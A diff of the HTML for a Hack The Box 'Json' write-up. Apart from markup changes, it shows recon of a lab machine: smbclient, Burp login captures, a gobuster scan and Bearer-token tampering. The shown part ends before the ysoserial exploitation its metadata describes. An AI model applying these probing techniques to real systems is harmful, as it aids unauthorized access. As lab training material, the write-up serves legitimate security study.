@@ -20,13 +20,9 @@
 
 
 
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
 
 
-
-<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css">
-
+<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.cd71908e0ee72a8733aeb9216405d664d48b2598bb3b750ec082bbf1b5b458cc.css" integrity="sha256-zXGQjg7nKoczrrkhZAXWZNSLJZi7O3UOwIK78bW0WMw=">
 
 
 
@@ -34,17 +30,15 @@
     <link rel="icon" type="image/png" sizes="32x32" href="https://0xade1.github.io/devdraft/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="https://0xade1.github.io/devdraft/favicon-16x16.png">
     <link rel="manifest" href="https://0xade1.github.io/devdraft/site.webmanifest">
-    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="#1b1c1d">
+    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="">
     <link rel="shortcut icon" href="https://0xade1.github.io/devdraft/favicon.ico">
-    <meta name="msapplication-TileColor" content="#1b1c1d">
-    <meta name="theme-color" content="#1b1c1d">
-
+    <meta name="msapplication-TileColor" content="">
 
 
 <meta itemprop="name" content="HTB - Json">
 <meta itemprop="description" content="Fuzz API and discover Json deserialization vulnerability exploitable with ysoserial. Multiple different privesc are possible to exercise several techniques e.g. zipslip, evilarc, loading FakeDLL, diaghub exploit ..."><meta itemprop="datePublished" content="2020-03-05T00:54:12+08:00" />
 <meta itemprop="dateModified" content="2020-03-05T00:54:12+08:00" />
-<meta itemprop="wordCount" content="2848"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
+<meta itemprop="wordCount" content="2489"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
 <meta itemprop="keywords" content="ASP.Net,ysoserial,tcpdump,juicypotato,dnsSpy,evil-winrm,chisel,ftp,tasklist,Diaghub,FakeDll,zipslip,evilarc,VisualStudio," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>
@@ -79,10 +73,14 @@
 
 
 
+
+
+
     </head>
 
     
         <body>
+    
     
         <div class="container">
             <header class="header">
@@ -91,7 +89,8 @@
     <div class="logo">
         
             <span class="logo__mark">&gt;</span>
-            <span class="logo__text"># cd /draft/</span>
+            <span class="logo__text ">
+                # cd /draft/</span>
             <span class="logo__cursor" style=
                   "
                    
@@ -116,6 +115,11 @@
                     </svg>
                 </span>
             
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
         </span>
     </span>
 </header>
@@ -126,42 +130,11 @@
   <main class="post">
 
     <div class="post-info">
-      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-calendar">
-  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
-  <line x1="16" y1="2" x2="16" y2="6"></line>
-  <line x1="8" y1="2" x2="8" y2="6"></line>
-  <line x1="3" y1="10" x2="21" y2="10"></line>
-</svg>
-
-  2020-03-04 
+      <p>
 
 
-  
- |
-
-      
-
-      
-
-      
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/htb-windows/">htb-windows</a></span>
         
-        |
-
-
-      
-        |
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="https://0xade1.github.io/devdraft/series/htb/">htb</a></span>
-        
-        |
-
-
-      
-
+      </p>
     </div>
 
     <article>
@@ -201,9 +174,11 @@
       
         <figure class="post-cover">
           <img src="https://www.hackthebox.eu/images/logo-htb.svg" alt="HTB - Json" />
-
+          
           
         </figure>
+      
+
       
 
       <div class="post-content">
@@ -215,35 +190,10 @@
 <li>message_signing: disabled (dangerous, but default) or not required</li>
 <li>Website with multiple Dead links: javascripts, images &hellip;</li>
 </ul>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#f1fa8c">\\</span>10.10.10.158 -n
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#f1fa8c">\\</span>10.10.10.158 -n
 </span></span><span style="display:flex;"><span>session setup failed: NT_STATUS_ACCESS_DENIED
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Connecting Burp-Suite, We can intercept the Login HTTP request, click Action: Send to repeater</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /api/token HTTP/1.1
+</span></span></code></pre></div><p>Connecting Burp-Suite, We can intercept the Login HTTP request, click Action: Send to repeater</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /api/token HTTP/1.1
 </span></span><span style="display:flex;"><span>Host: 10.10.10.158
 </span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#ff79c6">(</span>Macintosh; Intel Mac OS X 10.15; rv:72.0<span style="color:#ff79c6">)</span> Gecko/20100101 Firefox/72.0
 </span></span><span style="display:flex;"><span>Accept: application/json, text/plain, */*
@@ -256,27 +206,8 @@
 </span></span><span style="display:flex;"><span>Referer: http://10.10.10.158/login.html
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;UserName&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span>,<span style="color:#f1fa8c">&#34;Password&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span><span style="color:#ff79c6">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We have now the answer which contains a cookie</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#bd93f9">202</span> Accepted
+</span></span></code></pre></div><p>We have now the answer which contains a cookie</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#bd93f9">202</span> Accepted
 </span></span><span style="display:flex;"><span>Cache-Control: no-cache
 </span></span><span style="display:flex;"><span>Pragma: no-cache
 </span></span><span style="display:flex;"><span>Expires: -1
@@ -289,52 +220,15 @@
 </span></span><span style="display:flex;"><span>Content-Length: <span style="color:#bd93f9">0</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;Id&#34;</span>:1,<span style="color:#f1fa8c">&#34;UserName&#34;</span>:<span style="color:#f1fa8c">&#34;admin&#34;</span>,<span style="color:#f1fa8c">&#34;Password&#34;</span>:<span style="color:#f1fa8c">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span>,<span style="color:#f1fa8c">&#34;Name&#34;</span>:<span style="color:#f1fa8c">&#34;User Admin HTB&#34;</span>,<span style="color:#f1fa8c">&#34;Rol&#34;</span>:<span style="color:#f1fa8c">&#34;Administrator&#34;</span><span style="color:#ff79c6">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We are not successful to find additional sweet links</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json$ ../gobuster/gobuster dir --wordlist /opt/dictionaries/common.txt -o gobuster.log -u http://10.10.10.158/
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>No result, but we notice our HTTP POST is sent to /api/token (easier to spot from burp-suite Target tab)</p>
+</span></span></code></pre></div><p>We are not successful to find additional sweet links</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@6274ae97a895:~/json$ ../gobuster/gobuster dir --wordlist /opt/dictionaries/common.txt -o gobuster.log -u http://10.10.10.158/
+</span></span></code></pre></div><p>No result, but we notice our HTTP POST is sent to /api/token (easier to spot from burp-suite Target tab)</p>
 <p>We can try gobuster again with <code>-u http://..../api</code> in an attempt to discover more api links. A good resources is SecList</p>
 <blockquote>
 <p>git clone <a href="https://github.com/danielmiessler/SecLists.git">https://github.com/danielmiessler/SecLists.git</a></p>
 </blockquote>
 <p>Let&rsquo;s type /api/Account on Firefox and compare against the capture on Burp we made at login:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#50fa7b">GET</span> /api/Account/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#50fa7b">GET</span> /api/Account/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
 </span></span><span style="display:flex;"><span>Host<span style="color:#ff79c6">:</span> 10.10.10.158
 </span></span><span style="display:flex;"><span>User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
 </span></span><span style="display:flex;"><span>Accept<span style="color:#ff79c6">:</span> application/json, text/plain, */*
@@ -358,39 +252,10 @@
 </span></span><span style="display:flex;"><span>Content-Length: 119
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>{&#34;Id&#34;:1,&#34;UserName&#34;:&#34;admin&#34;,&#34;Password&#34;:&#34;21232f297a57a5a743894a0e4a801fc3&#34;,&#34;Name&#34;:&#34;User Admin HTB&#34;,&#34;Rol&#34;:&#34;Administrator&#34;}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>21232f297a57a5a743894a0e4a801fc3 happens to be the md5sum of the password which is admin</p>
+</span></span></code></pre></div><p>21232f297a57a5a743894a0e4a801fc3 happens to be the md5sum of the password which is admin</p>
 <p>The only difference is the absence of the bearer which happens to be part of SWAGGER.
 An interesting observation is that the Bearer is identical to the OAuth2 base64 encoded json-string</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#50fa7b">GET</span> /api/Account/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#50fa7b">GET</span> /api/Account/ <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
 </span></span><span style="display:flex;"><span>Host<span style="color:#ff79c6">:</span> 10.10.10.158
 </span></span><span style="display:flex;"><span>User-Agent<span style="color:#ff79c6">:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
 </span></span><span style="display:flex;"><span>Accept<span style="color:#ff79c6">:</span> application/json, text/plain, */*
@@ -413,27 +278,8 @@ An interesting observation is that the Bearer is identical to the OAuth2 base64 
 </span></span><span style="display:flex;"><span>Content-Length: 61
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>{&#34;Message&#34;:&#34;Authorization has been denied for this request.&#34;}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>On modifying the Bearer within Burp Repeater with <code> Bearer: sec fluctuat nec mergitur</code></p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span> <span style="color:#bd93f9">500</span> Internal Server Error
+</span></span></code></pre></div><p>On modifying the Bearer within Burp Repeater with <code> Bearer: sec fluctuat nec mergitur</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span> <span style="color:#bd93f9">500</span> Internal Server Error
 </span></span><span style="display:flex;"><span>Cache-Control<span style="color:#ff79c6">:</span> no-cache
 </span></span><span style="display:flex;"><span>Pragma<span style="color:#ff79c6">:</span> no-cache
 </span></span><span style="display:flex;"><span>Content-Type<span style="color:#ff79c6">:</span> application/json; charset=utf-8
@@ -446,40 +292,14 @@ An interesting observation is that the Bearer is identical to the OAuth2 base64 
 </span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff79c6">:</span> 132
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>{<span style="color:#ff79c6">&#34;Message&#34;</span>:<span style="color:#f1fa8c">&#34;An error has occurred.&#34;</span>,<span style="color:#ff79c6">&#34;ExceptionMessage&#34;</span>:<span style="color:#f1fa8c">&#34;Invalid format base64&#34;</span>,<span style="color:#ff79c6">&#34;ExceptionType&#34;</span>:<span style="color:#f1fa8c">&#34;System.Exception&#34;</span>,<span style="color:#ff79c6">&#34;StackTrace&#34;</span>:<span style="color:#ff79c6">null</span>}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Changing the Bearer with base64; Server will ask for json format</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
